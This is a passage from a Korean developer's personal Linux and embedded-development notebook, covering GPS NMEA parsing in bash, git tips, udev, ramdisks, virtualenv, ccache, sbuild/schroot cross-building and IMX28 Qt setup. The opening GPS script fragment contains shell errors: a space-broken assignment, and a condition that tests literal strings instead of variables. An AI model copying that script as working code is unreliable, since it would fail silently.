    latitudeNS=`echo $RESPONSE | cut -d',' -f5`
    latitudeDec=$(gpsDecimal $latitudeValue $latitudeNS)
    longitudeValue=`echo $RESPONSE | cut -d',' -f6`
    longitudeEW = `echo $RESPONSE | cut -d',' -f7`
    longitudeDec=$(gpsDecimal $longitudeValue $longitudeEW)

    fi # $GPRMC sentence

done # read-line loop

closePort

# If we get to here and location and reliability were OK, we
# have a fix.
if [[ foundReliability = 'true' && foundLocation = 'true' ]]
then
  echo "$STATUS_OK $latitudeDec $longitudeDec"
  exit 0
fi

# Fallthrough to here means too many lines were read without
# finding location information. Return failure.
echo "$STATUS_NOTFOUND 0 0"
exit 1
```

<http://lakenine.com/reading-and-parsing-gps-sentences-a-linux-example/>  


### <span class="section-num">3.55</span> serial port reset {#serial-port-reset}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-24 화 16:12&gt;</span></span>  

```text
$ sudo tput reset > /dev/ttyXX
```


### <span class="section-num">3.56</span> ltib 패키지 단위로 작업하기 {#ltib-패키지-단위로-작업하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-27 금 16:41&gt;</span></span>  
ltib 에서 패키지 단위로 작업할 수 있다.  

```text
./ltib -help
/* List the packages in LTIB */
./ltib –m listpkgs
/* Get the source code of one package. The source code will be extracted to <ltib folder>/
rpm/BUILD/  */
./ltib -m prep -p <package name>
/* This command is used to build the source code of <package name>. If you modify the source 
code, you can rebuild the source code by this command  */
./ltib -m scbuild -p <package name>
/* Install one package to rootfs */
./ltib -m scdeploy -p <package name>
```


### <span class="section-num">3.57</span> udev 간단 예제 {#udev-간단-예제}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-05 토 20:23&gt;</span></span>  
udev 규칙파일 형식  

```text
match[, <match>]*, assignment[, <assignment>]*
```

match는 조건을 나타내고, assignment는 매치조건이 성립될 시 실행할동작을 지정한다. 매치조건과 실행항목은  여러개가 될 수 있다.  

```text
KERNEL == "ttySAC[0-2]*", NAME = "tts/%n", SYMLINK = "%k"
```

match 조건은 match key `= "표현식" 구조인데 위의 예에서는
KERNEL =` "ttySAC[0-2]\*" 부분이 매치조건이고 나머지가실행 항목이다. 실행항목은 부등호(=)가 하나인게 다르다.  
실행항목도 실행항목키 = "표현식" 구조이다.  
위에서 %n은 장치 번호, %k는 커널의 장치 이름을 나타낸다.  
매치키  

실행항목키  


### <span class="section-num">3.58</span> ramdisk 사용법 {#ramdisk-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-05 토 21:46&gt;</span></span>  

1.  루프백 디바이스 파일 만들기(8M)  
    
    ```text
    $ dd if=/dev/zero of=ramdisk bs=1k count=8192
    ```
2.  ext4 파일시스템 생성  
    
    ```text
    $ mkfs.ext4 ramdisk
    ```
3.  마운트  
    
    ```text
    $ sudo mount -o loop ramdisk /mnt/ramdisk
    ```
4.  파일복사  
    
    ```text
    $ cd rootfs
    $ sudo sh - c "find . -print0 | cpio -p0dm /mnt/ramdisk"
    ```
5.  언마운트후 압축  
    
    ```text
    $ sudo umount /mnt/ramdisk
    $ gzip -v ramdisk
    ```


### <span class="section-num">3.59</span> 부트스트랩 코드에서 사용하는 로우레벨 UART 포트 설정 {#부트스트랩-코드에서-사용하는-로우레벨-uart-포트-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-12 토 00:36&gt;</span></span>  
arch/arm/plat-samsung/include/plat/uncompressed.h  

```text
#define uart_base S3C_PA_UART + (S3C_UART_OFFSET * CONFIG_S3C_LOWLEVEL_UART_PORT)
```


### <span class="section-num">3.60</span> Kernel parameter {#kernel-parameter}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-15 화 10:31&gt;</span></span>  
quiet - Disable most log messages  
<https://www.kernel.org/doc/Documentation/kernel-parameters.txt>  


### <span class="section-num">3.61</span> endian 알아내기 {#endian-알아내기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-24 목 13:51&gt;</span></span>  

```text
#include <stdio.h>

int main(int argc, char * argv[])
{
    int num = 1;
    if(*(char *)&num == 1)
    {
        printf("\nLittle-Endian\n");
    }
    else
    {
        printf("Big-Endian\n");
    }
    return 0;    
}
```


### <span class="section-num">3.62</span> git detached {#git-detached}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-27 일 17:08&gt;</span></span>  
브랜치를 만들지 않고 체크아웃하였을 때 detached 상태가 되어서저장소를 수정하였다면 변경 내용을 잃을 수 있다. 해당 브랜치를 만들어주어야 한다.  

```text
$ git checkout -b foo
```

<http://foris.tistory.com/150>  


### <span class="section-num">3.63</span> git log message 수정 {#git-log-message-수정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-27 일 17:46&gt;</span></span>  

1.  마지막 커밋 메시지 변경  
    
    ```text
    $ git commit --amend
    ```
2.  그보다 오래된 메시지 변경  
    
    ```text
    $ git rebase -i HEAD~3
    ```
    
    rebase 를 사용하여 오래된 커밋의 sha1을 지정한다.  
    메뉴에서 reword 를 선택하고 저장하면  변경창이나타나서 수정할 수 있다.

\*주의\* Linus Torvalds는 이미 푸시한 내용에 대해서는변경하지 말 것을 경고한다.  


### <span class="section-num">3.64</span> PYTHON virtualenv {#python-virtualenv}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-01 금 21:02&gt;</span></span>  
배포판 python default 패키지가 python3 인 경우 python2 환경에서작업해야할 경우 python2 가상 환경을 만들기 위해 다음과 같이 한다.  

```text
$ sudo pacman -Syu  python2-virtualenv 
# virtualenv 디렉토리 생성
$ virtualenv ~/my_env
# 활성화
$ source my_env/bin/activate
# 나가기 
(my_env)$ deactivate
```

한번 virtualenv 디렉토리 생성후에는 활성화시 activate  
비활성화시 deactivate 호출만 하면 된다.  
<https://wiki.archlinux.org/index.php/Python/Virtualenv>  


### <span class="section-num">3.65</span> VIRTUALENV WRAPPER {#virtualenv-wrapper}

virtualenvwrapper extentions 을 설치하면 좀 더 편리하게파이썬 가상 환경을 관리할 수 있다.  

1.  먼저 패키지를 설치한다.  
    
    ```text
    $ sudo apt install virtualenvwrapper
    ```
2.  .bashrc 에 다음을 추가한다.  
    
    ```text
    export WORKON_HOME=$HOME/.virtualenvs
    #export PROJECT_HOME=$HOME/project
    source /usr/share/virtualenvwrapper/virtualenvwrapper.sh
    ```
3.  사용법  
    -   virtual environment 생성. $HOME/.virtualenvs/myenv가 생성됨  
        
        ```text
        $ mkvirtualenv myenv
        or for python3
        $ mkvirtualenv -p /usr/bin/python3 myenv3
        ```
    -   활성  
        
        ```text
        $ workon myenv
        ```
    -   비활성  
        
        ```text
        (myenv) $ deactivate
        ```
4.  링크  
    <http://virtualenvwrapper.readthedocs.io/en/latest/index.html>


### <span class="section-num">3.66</span> CCACHE {#ccache}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-01 금 21:13&gt;</span></span>  
아치리눅스에서 ccache 사용을 위해서는 PATH에 /usr/lib/ccache/bin 을추가해주어야 한다. makepkg 와 colorgcc를 위한 설정도 추가했다.  

1.  For commandline  
    
    ```text
    $ export PATH="/usr/lib/ccache/bin/:$PATH"
    ```

2.  For makepkg - /etc/makepkg변경  
    
    ```text
    BUILDENV=(fakeroot !distcc color ccache check !sign)
    ```

3.  For colorgcc  
    
    ```text
    # As per usual colorgcc installation, leave unchanged (don't add ccache)
    $ export PATH="/usr/lib/colorgcc/bin/:$PATH"
    # Tell ccache to only use compilers here
    $ export CCACHE_PATH="/usr/bin"                 
    ```
    
    /etc/colorgcc/colorgccrc  
    
    ```text
    g++: /usr/lib/ccache/bin/g++
    gcc: /usr/lib/ccache/bin/gcc
    c++: /usr/lib/ccache/bin/g++
    cc: /usr/lib/ccache/bin/cc
    g77:/usr/bin/g77
    f77:/usr/bin/g77
    gcj:/usr/bin/gcj
    ```


### <span class="section-num">3.67</span> Kernel Build 시 defined(@array) Error {#kernel-build-시-defined--array--error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-03 일 20:38&gt;</span></span>  
perl 버전이 맞지 않아서 커널 빌드시 defined(@array) 관련 에러메시지가나올때 defined() 부분을 제거하면 된다.  

```text
if (!defined(@val)) {
to
if (!@val) {
```

<http://freetz.org/ticket/2759>  


### <span class="section-num">3.68</span> Macosx pkg 파일 풀기 {#macosx-pkg-파일-풀기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-13 수 11:46&gt;</span></span>  
먼저 아래 사이트에서 xar를 다운받아 설치한다.  
<http://code.google.com/p/xar/>.  
Just download, unpack, configure, make , make install  

```text
파일 컨텐츠 보기
$ xar -tf something.pkg
풀기
$ xar -xf something.pkg
```

Payload 안에 압축된 파일들을 푼다.  

```text
gunzip -c Payload | cpio -i
```

링크 - <http://blog.acsystem.sk/linux/upack-pkg-from-macosx-in-linux>  


### <span class="section-num">3.69</span> 파일 Encoding 변환 {#파일-encoding-변환}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-21 목 16:12&gt;</span></span>  
로컬 로케일을 사용하는 경우 소스 코드를 여기저기서 각기 다른코딩시스템으로 저장하여 엉망이 되어 버린경우가 있다. 이런 경우먼저 파일엔코딩을 디텍팅 한후 적절하게 변환하여야 한다.  

1.  파일 엔코딩 디텍팅에디터에서 자동으로 디텍팅하지 못할 경우는 유틸리티를 사용하여야한다.  
    
    ```text
    $ uchardet file_name
    ```
2.  엔코딩 변환엔코딩을 제대로 디텍팅 하였다면 iconv 유틸을 사용하여 파일 엔코딩을변환할 수 있다.  
    
    ```text
    $ iconv -f euc-kr -t utf-8 -o save_name file_name
    ```
    
    변환할 수 없는 글자들을 무시하려면 -c 옵션을 사용한다.  
    
    ```text
    $ iconv -c -f utf-8 -t ascii -o out.txt in.txt
    ```
3.  참조  
    <http://superuser.com/questions/301552/how-to-auto-detect-text-file-encoding>  
    <http://www.shellhacks.com/en/HowTo-Determine-and-Change-File-Character-Encoding>  
    <http://www.jveweb.net/en/archives/2010/08/detecting-and-changing-the-encoding-of-text-files.html>


### <span class="section-num">3.70</span> gitignore 파일을 이미 커밋한 저장소에 적용하기 {#gitignore-파일을-이미-커밋한-저장소에-적용하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-22 금 22:53&gt;</span></span>  

```text
$ git rm -r --cached .
$ git add .
$ git commit -m ".gitignore is now working"
```


### <span class="section-num">3.71</span> git archive {#git-archive}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-25 월 12:18&gt;</span></span>  

```text
git archive --format=tar --prefix=Naju-rc1/ Naju-rc1| gzip > Naju-rc1.tar.gz
```

prefix는 source 압축을 해제할 때 base 디렉토리를 지정하는 것이다.  
위의 경우는 Naju-rc1/ 아래 tar 파일이 압축 해제된다. Naju-rc1 은태그 이름이다. 또는 올바른 커밋명이어야 한다.  


### <span class="section-num">3.72</span> group mail 보내기 {#group-mail-보내기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-26 화 15:33&gt;</span></span>  
여러 사람에게 단체 메일을 보내거나 프로젝트 그룹에 CC 필드로 메일을보낼 때 그룹 alias를 사용하면 편리하다.  
bbdb 에서 alias 를 지정할 이름을 찾은 후 a 키를 누르면 alias를지정할 수 있다.  


### <span class="section-num">3.73</span> Pacman Error {#pacman-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-26 화 21:42&gt;</span></span>  
archlinux package upgrade 시 key 에러가 날때해결책  

```text
error: confuse: signature from "Thorsten Töpper <atsutane@freethoughts.de>" is unknown trust
error: failed to commit transaction (invalid or corrupted package)
Errors occurred, no packages were upgraded.

$ sudo pacman-key --refresh-keys
```

<https://bbs.archlinux.org/viewtopic.php?id=156905>  


### <span class="section-num">3.74</span> grep 이 파일 타입을 잘못 감지할 때 {#grep-이-파일-타입을-잘못-감지할-때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-26 화 22:32&gt;</span></span>  
지역 로케일을 사용할 때 파이프로 연결된 grep 이 타입을 잘못 감지해서  

```text
Binary file (표준 입력) matches
```

메시지만 표시할 때가 있다. 실제 바이너리 데이터가 아니라면  
-a 옵션을 사용하면 된다.  

```text
$ grep -a foo bar.data
```


### <span class="section-num">3.75</span> debian java 6 설정 {#debian-java-6-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-01-27 수 01:54&gt;</span></span>  

```text
$ sudo apt-get install java-package
# Download jdk http://www.oracle.com/technetwork/java/javase/downloads/index.html
$ make-jpkg jdk-6u45-linux-x64.bin
$ sudo dpkg -i oracle-java6-jdk_6u45_amd64.deb
$ sudo update-java-alternatives -s jdk-6-oracle-x64
```


### <span class="section-num">3.76</span> 라이브러리 만들기 {#라이브러리-만들기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-02-10 수 17:58&gt;</span></span>  


#### <span class="section-num">3.76.1</span> Static Libraries {#static-libraries}

```text
$ gcc -static -c -o libfoo.o libfoo.c
$ gcc -static -c -o libfoo2.o libfoo2.c
$ ar rcs libfoo.a libfoo.o libfoo2.o
This tells ar to create an archive (c), 
insert the objects, replacing older files where needed (r) 
and to write out an index (s).
$ gcc main.c -o test -lfoo
```


#### <span class="section-num">3.76.2</span> Shared(Dynamic) Libraries {#shared--dynamic--libraries}

```text
$ gcc -shared -fPIC -o libfoo.so libfoo.c libfoo2.c
$ gcc -L$(pwd) -o test main.c -lfoo
```

Shared Libraries 실행하면  

```text
$ ./test
./test: error while loading shared libraries: libfoo.so: 
cannot open shared object file: No such file or directory
```

위와 같은 에러가 난다.  

1.   해결책

    1.  LD\_LIBRARY\_PATH를 재정의한다.  
        
        ```text
        $ LD_LIBRARY_PATH=. ./test
        ```
    2.  rpath를 사용하여 컴파일한다.  
        
        ```text
        gcc -L$(pwd) -Wl,-rpath=$(pwd) -o test main.c -lfoo
        ```
    3.  /lib /usr/lib 에 라이브러리를 설치한다.
    4.  /etc/ld.so.conf.d/ 아래 파이을 만들고 ldconfig 를실행하여 cache를 새로 만든다.  
        
        ```text
        $ cat > /etc/ld.so.conf.d/nessus.conf
        /opt/nessus/lib
        $ sudo ldconfig
        ```


### <span class="section-num">3.77</span> NFS on archlinux {#nfs-on-archlinux}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-02-13 토 18:53&gt;</span></span>  
archlinux 에서 nfs server enable 하려면  

```text
$ sudo systemctl start nfs-server rpcbind
```


### <span class="section-num">3.78</span> image 형식 변환 {#image-형식-변환}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 11:01&gt;</span></span>  


#### <span class="section-num">3.78.1</span> 이미지 하나만 변환하기 {#이미지-하나만-변환하기}

```text
$ convert test.png test.jpg
```


#### <span class="section-num">3.78.2</span> 여러개 동시에 변환하기 {#여러개-동시에-변환하기}

```text
$ mogrify -format jpg *.png  
```


#### <span class="section-num">3.78.3</span> image size 변환 {#image-size-변환}

```text
$ mogrify -resize 320x240 Image.png 
$ mogrify -resize 50% Image.png
$ mogrify -resize 320x240 *.jpg
```

위명령은 ratio가 맞지 않으면 320x240을 지정해도 다른 사이즈로 변환된다. ratio를 무시하고 강제로 변환하려면 \\! 를 덧붙인다.  

```text
$ mogrify -resize 320x240\! *.jpg
```


### <span class="section-num">3.79</span> build dependency 설치 {#build-dependency-설치}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 17:37&gt;</span></span>  
소스 컴파일시 필요한 패키지를 자동 설치하려면 아래를 실행한다.  

```text
sudo apt-get build-dep package
```

[howtogeek](http://www.howtogeek.com/106526/how-to-resolve-dependencies-while-compiling-software-on-ubuntu/)  


### <span class="section-num">3.80</span> git stash {#git-stash}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-04-27 수 18:20&gt;</span></span>  
현재 작업중인 내용을 임시로 저장하는 방법  

-   git stash save stash\_name  
    현재 작업을 저장해두고 branch를 head로 돌린다.(git reset –hard)
-   git stash list  
    저장되어 있는 stash들 보기
-   git stash pop  
    stash들은 stack에 저장된다. 따라서 가장 최근에 save한 stash가 현재 branch에 적용된다.
-   git stash apply stash\_name  
    git stash pop 과 비슷한 명령어지만 stash list에서 삭제하지 않는다는 점이 다르다.
-   git stash drop stash\_name  
    필요 없는 stash를 삭제
-   git stash clear  
    전체 stash list를 삭제

<http://wit.nts-corp.com/2014/03/25/1153>  


### <span class="section-num">3.81</span> Debian Cross Compile 2 {#debian-cross-compile-2}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-05-03 화 13:04&gt;</span></span>  


#### <span class="section-num">3.81.1</span> 이전방식 {#이전방식}

```text
$ export DEB_HOST_GNU_TYPE=arm-linux
$ fakeroot debian/rules binary
```

이렇게 하면 문제없이 arm package를 빌드 할 수 있었다.  
현재 이 방식은 제대로 동작하지 않는다.  


#### <span class="section-num">3.81.2</span> 현재 cross compile 방법 {#현재-cross-compile-방법}

1.  source 패키지를 다운로드한다.  
    
    ```text
    $ apt-get source i2c-tools
    ```
2.  Makefile 이 있다면 CC 나 CFLAGS 부분을 cross toolchaind 에 맞게 수정한다.
3.  configure 를 하여 Makefile을 만드는 구조라면 configure 시  
    cross compiler 와 host 옵션을 알맞게 설정한다.  
    
    ```text
    $ ./configure --CC=arm-linux-gcc --host=arm-linux
    ```


### <span class="section-num">3.82</span> sbuild {#sbuild}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-05-03 화 18:33&gt;</span></span>  
Debian source로 부터 패키지를 빌드하며, 의존 패키지도 자동 설치한다.  
host 시스템이 아닌 전용 chroot 환경에서 빌드한다. perl 스크립트이다.  
먼저 sbuild 전용 chroot 환경을 만들어야 하는데 sbuild-createchroot  
명령이나 mk-sbuild 를 사용할 수 있다.  


#### <span class="section-num">3.82.1</span> Cross Building {#cross-building}

```text
mk-sbuild 상세내용은 아래 참조
$ mk-sbuild --target=armhf trusty 
처음 빌드시만 실행
$ sbuild-update --keygen 
$ sbuild --build=amd64 --host=armhf -d trusty foo.dsc
```

1.   링크

    <https://wiki.ubuntu.com/CrossBuilding>  


### <span class="section-num">3.83</span> Multiarch CrossDependencies {#multiarch-crossdependencies}

arm cross 컴파일을 위한 의존 패키지 설치  

```text
$ apt-get build-dep -a armel atk1.0
```


#### <span class="section-num">3.83.1</span> 링크 {#링크}

<https://wiki.debian.org/Multiarch/CrossDependencies>  


### <span class="section-num">3.84</span> mk-sbuild {#mk-sbuild}

ubuntu-dev-tools 패키지에 포함되어 있다.  

1.  패키지 설치  
    
    ```text
    $ sudo apt install sbuild debhelper ubuntu-dev-tools
    ```
2.  선택사항: 패키지 proxy 설정  
    
    ```text
    $ sudo apt install apt-cacher-ng
    $ echo 'Acquire::http::Proxy "http://127.0.0.1:3142";' | sudo tee /etc/apt/apt.conf.d/01acng
    ```
3.  sbuild 그룹에 사용자 추가  
    
    ```text
    $ sudo adduser $USER sbuild
    ```
4.  home 과 scratch mount point 설정  
    
    ```text
    # Create the directory for the mount point:
    $ mkdir -p $HOME/sbuild/scratch
    #  Append to /etc/schroot/sbuild/fstab:
    /home/ybgwon/sbuild/scratch  /scratch          none  rw,bind  0  0
    # add home
    /home/<username>                 /home/<username>  none  rw,bind  0  0
    ```
5.  ~/.sbuildrc 작성  
    
    ```text
    # Mail address where logs are sent to (mandatory, no default!)
    $mailto = $ENV{USER};
    
    # Name to use as override in .changes files for the Maintainer: field
    # (mandatory, no default!).
    $maintainer_name='Your Name <user@ubuntu.com>';
    
    # Default distribution to build.
    $distribution = "yakkety";
    # Build arch-all by default.
    $build_arch_all = 1;
    
    # When to purge the build directory afterwards; possible values are "never",
    # "successful", and "always".  "always" is the default. It can be helpful
    # to preserve failing builds for debugging purposes.  Switch these comments
    # if you want to preserve even successful builds, and then use
    # "schroot -e --all-sessions" to clean them up manually.
    # 빌드시 만들어진 파일을 삭제하지 않으려면 never로 설정한다.
    # 그렇지 않으면 패키지만 남기고 나머지는 삭제된다.
    # $purge_build_directory = 'successful';
    # $purge_session = 'successful';
    # $purge_build_deps = 'successful';
    $purge_build_directory = 'never';
    $purge_session = 'never';
    $purge_build_deps = 'never';
    
    # Directory for writing build logs to
    $log_dir=$ENV{HOME}."/sbuild/logs";
    
    # don't remove this, Perl needs it:
    1;
    ```
6.  ~/.mk-sbuild.rc 작성  
    
    ```text
    SCHROOT_CONF_SUFFIX="source-root-users=root,sbuild,admin
    source-root-groups=root,sbuild,admin
    preserve-environment=true"
    # you might want to undo the below for stable releases, read `man mk-sbuild` for details
    SKIP_UPDATES="1"
    SKIP_PROPOSED="1"
    # if you have e.g. apt-cacher-ng around
    DEBOOTSTRAP_PROXY=http://127.0.0.1:3142/
    ```
7.  기타 설정  
    
    ```text
    $ mkdir -p $HOME/sbuild/logs
    $ sg sbuild # sbuild 그룹 진입
    $ sbuild-update --keygen
    ```
8.  create schroots  
    
    ```text
    $ mk-sbuild trusty --target=armhf
    ```


#### <span class="section-num">3.84.1</span> 링크 {#링크}

<https://wiki.ubuntu.com/SimpleSbuild>  


### <span class="section-num">3.85</span> sbuild-createchroot {#sbuild-createchroot}

debian 에서는 chroot 환경 빌드시 sbuild-createchroot 를 추천한다.  

```text
$ sudo sbuild-createchroot --make-sbuild-tarball=/srv/chroots/jessie-sbuild.tgz jessie /srv/chroots/jessie http://httpredir.debian.org/debian/
$ sudo sbuild-adduser <your-username>
$ sbuild-update --keygen
```


### <span class="section-num">3.86</span> schroot 사용하기 {#schroot-사용하기}

mk-sbuild 를 사용하여 chroot 환경을 구성했다면 schroot 를 사용하여  
chroot 환경으로 진입할 수 있다.  


#### <span class="section-num">3.86.1</span> Using {#using}

```text
$ schroot -c source:trusty-amd64-armhf -u root
```


#### <span class="section-num">3.86.2</span> 삭제 {#삭제}

```text
$ schroot -l
$ sudo rm /etc/schroot/chroot.d/sbuild-trusty-amd64-armhf
$ sudo rm -rf /var/lib/schroot/chroots/trusty-amd64-armhf
```


### <span class="section-num">3.87</span> schroot 사용 (데비안) {#schroot-사용--데비안}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-14 월&gt;</span></span>  
sbuild 와 연동하지 않고 간단히 chroot 환경만 사용하는 경우이다.  
데비안 stretch에서 테스트 하였다.  


#### <span class="section-num">3.87.1</span> 설치 {#설치}

```text
$ sudo apt install schroot debootstrap
$ sudo cp /etc/schroot/schroot.conf /etc/schroot/schroot.conf.old
$ sudo mkdir -p /srv/chroot/jessie
$ sudo debootstrap jessie /srv/chroot/jessie
```


#### <span class="section-num">3.87.2</span> /etc/schroot/schroot.conf 편집 {#etc-schroot-schroot-dot-conf-편집}

```text
[jessie]
description=Debian jessie (stable)
type=directory
directory=/srv/chroot/jessie
users=ybgwon
#groups=sudo
root-groups=sudo,root
aliases=stable
personality=linux
preserve-environment=true
```


#### <span class="section-num">3.87.3</span> 사용 {#사용}

```text
$ schroot -c jessie
```


### <span class="section-num">3.88</span> multiarch {#multiarch}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-05-03 화 20:43&gt;</span></span>  

-   add extra architecture  
    
    ```text
    $ sudo dpkg --add-architecture armhf
    $ sudo apt-get update
    ```
-   remove architecture  
    
    ```text
    $ sudo apt-get purge ".*:armhf"
    $ sudo dpkg --remove-architecture armhf
    ```
-   package 설치  
    
    ```text
    $ sudo apt-get install links:i386
    ```
-   cross 의존 패키지 설치  
    
    ```text
    $ sudo apt-get build-dep -a armhf acl
    ```
-   apt sources 설정  
    ubuntu의 경우 architecture 별로 구성할 수 있다.  
    현재(2016-05-03) armel 의 경우 ports.ubuntu.com에서 미러하지 않고 있다.  
    
    ```text
    deb [arch=amd64,i386] http://uk.archive.ubuntu.com/ubuntu/ quantal main universe
    deb [arch=armhf] http://ports.ubuntu.com/ubuntu-ports quantal main universe
    ```
-   링크  
    <https://wiki.debian.org/Multiarch/HOWTO>


### <span class="section-num">3.89</span> 24cxx eeprom driver porting {#24cxx-eeprom-driver-porting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-05-10 화 10:32&gt;</span></span>  
drivers/misc/eeprom/ 에서 I2C EEPROMs from most vendors 부분을선택한다.(CONFIG\_EEPROM\_AT24)  
보드 init 소스에서 i2c 주소를 연결하고 디바이스 설정을 한다.  
설정이 제대로 되었다면  
/sys/devices/platform/imx-i2c.1/i2c-1/1-0050/eeprom  
과 같이 읽고 쓸 수 있는 디바이스 파일이 생성된다.  
만약 모듈로 컴파일하였다면 lsmod 명령에서 at24 가 나타나야 한다.  


#### <span class="section-num">3.89.1</span> 사용법 {#사용법}

1.  읽기  
    
    ```text
    $ cat /sys/devices/platform/imx-i2c.1/i2c-1/1-0050/eeprom
    또는
    $ hexdump /sys/devices/platform/imx-i2c.1/i2c-1/1-0050/eeprom
    ```
2.  쓰기  
    
    ```text
    $ echo "abcde" > /sys/devices/platform/imx-i2c.1/i2c-1/1-0050/eeprom
    ```


### <span class="section-num">3.90</span> git clone all branches {#git-clone-all-branches}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-28 화 15:45&gt;</span></span>  
git clone 은 모든 branch를 clone 하지 않는다.  

1.  특정 브랜치만 chekcout 하기  
    
    ```text
    $ git branch -a
    master
    remotes/origin/HEAD
    remotes/origin/master
    remotes/origin/v1.0-stable
    remotes/origin/experimental
    
    $ git checkout -b experimental origin/experimental
    ```
2.  전체 branch를 clone  
    
    ```text
    clone-branches alias 를 작성하여 사용한다.
    $ git config --global alias.clone-branches '! git branch -a | sed -n "/\/HEAD /d; /\/master$/d; /remotes/p;" | xargs -L1 git checkout -t'
    $ git clone-branches
    ```


### <span class="section-num">3.91</span> 특정 사용자의 commit diff 만들기 {#특정-사용자의-commit-diff-만들기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-29 수 15:35&gt;</span></span>  

```text
$ git log -p author=ybgwon
```

안드로이드 repo 에서는  

```text
$ repo forall -p -c git log -p author=ybgwon
```


### <span class="section-num">3.92</span> 날짜를 이용한 git diff 사용 {#날짜를-이용한-git-diff-사용}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-06-29 수 15:39&gt;</span></span>  

```text
$ git diff HEAD@{"2016-01-09"} HEAD
또는
$ git log -p --since="2016-01-09"
```

안드로이드 repo 에서는  

```text
$ repo forall -p -c git diff HEAD@{"2016-01-09"} HEAD
또는
$ repo forall -p -c git log -p --since="2016-01-09"
```


### <span class="section-num">3.93</span> git rebase 후 다시 원복 할 때 {#git-rebase-후-다시-원복-할-때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-05 화 13:45&gt;</span></span>  

```text
$ git reset --hard ORIG_HEAD
```


### <span class="section-num">3.94</span> checkout a single file from another commit or branch {#checkout-a-single-file-from-another-commit-or-branch}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-07 목 13:33&gt;</span></span>  

```text
$ git checkout feature_1 -- path/to/file/iwant
or just to see a particular version temporarily
$ git show $revision:$file | less
```

or  

```text
M-x magit-find-file
```

<https://ariejan.net/2011/09/13/git-checkout-a-single-file-from-another-commit-or-branch/>  
[stackoverflow](http://stackoverflow.com/questions/215718/reset-or-revert-a-specific-file-to-a-specific-revision-using-git)  
[stackexchange](http://emacs.stackexchange.com/questions/7655/how-can-i-open-a-specific-revision-of-a-file-with-magit)  


### <span class="section-num">3.95</span> IMX28 MFGTools 용 이미지 빌드 {#imx28-mfgtools-용-이미지-빌드}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-15 금 20:51&gt;</span></span>  

```text
$ ./ltib --selectype
```


### <span class="section-num">3.96</span> IMX28용 Qt Embedded with tslib 설치 {#imx28용-qt-embedded-with-tslib-설치}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-19 화 18:31&gt;</span></span>  

1.  tslib 을 먼저 설치한다.  
    
    ```text
    $ ./ltib -p tslib -f
    ```
    
    could not support the device 에러가 발생하면  
    ltib/rpm/BUILD/tslib-1.0/plugins/input-raw.c 에서  
    check\_fd 함수의 아래 부분을 막는다.  
    
    ```text
    #if 0
         if ((0 == test_bit(ABS_MT_POSITION_X, absbits)) ||
    	      (0 == test_bit(ABS_MT_POSITION_Y, absbits)) ||
    	      (0 == test_bit(ABS_MT_TOUCH_MAJOR, absbits))) {
    	     fprintf(stderr, "error: could not support the device\n");
    	     fprintf(stderr, "EV_SYN=%d\n", test_bit(EV_SYN, absbits));
    	     fprintf(stderr, "EV_ABS=%d\n", test_bit(EV_ABS, absbits));
    	     fprintf(stderr, "ABS_MT_POSITION_X=%d\n", test_bit(ABS_MT_POSITION_X, absbits));
    	     fprintf(stderr, "ABS_MT_POSITION_Y=%d\n", test_bit(ABS_MT_POSITION_Y, absbits));
    	     fprintf(stderr, "ABS_MT_TOUCH_MAJOR=%d\n", test_bit(ABS_MT_TOUCH_MAJOR, absbits));
    	     return -1;
         }
    #endif
    ```
2.  qt 4.8.x 를 다운하고 압축을 푼다.  
    
    ```text
    $ mkdir /opt/imx28 && cd /opt/imx28
    $ wget http://download.qt.io/archive/qt/4.8/4.8.6/qt-everywhere-opensource-src-4.8.6.tar.gz
    $ tar zxvf qt-everywhere-opensource-src-4.8.6.tar.gz
    $ cd qt-everywhere-opensource-src-4.8.6
    ```

3.  mkspecs/qws/linux-arm-gnueabi-g++/qmake.conf 파일을 열어 아래 부분추가  
    
    ```text
    QMAKE_LFLAGS		+= -Wl,-rpath-link=/opt/mx6/tslib/lib -lts -lrt
    ```

4.  configure 파일에서 tslib 부분에서 에러가 나도 계속 진행하게  
    exit 1 부분 주석 처리  
    
    ```text
    for mouse in ${CFG_MOUSE_ON} ${CFG_MOUSE_PLUGIN}; do
        if [ "${mouse}" = "tslib" ] && [ "${CFG_CONFIGURE_EXIT_ON_ERROR}" = "yes" ]; then
            compileTest unix/tslib "tslib"
            if [ $? != "0" ]; then
               echo "The tslib functionality test failed!"
